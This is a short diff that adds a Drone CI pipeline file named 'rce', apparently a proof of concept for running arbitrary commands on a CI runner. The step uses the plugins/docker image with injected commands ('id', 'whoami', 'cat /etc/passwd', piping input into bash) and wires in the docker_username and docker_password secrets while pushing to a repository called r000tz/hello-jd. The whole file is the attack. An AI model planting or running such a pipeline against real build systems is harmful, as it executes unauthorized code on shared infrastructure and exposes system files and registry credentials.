@@ -1,0 +1,21 @@
+kind: pipeline
+type: docker
+name: rce
+
+steps:
+- name: docker  
+  image: plugins/docker
+  commands:
+    - 'id'
+    - 'whoami'
+    - 'cat /etc/passwd'
+    - 'echo " Done " | bash'
+  settings:
+    # registry: docker.io
+    repo: r000tz/hello-jd
+    username:
+      from_secret: docker_username
+    password:
+      from_secret: docker_password
+    tags: 
+      - latest
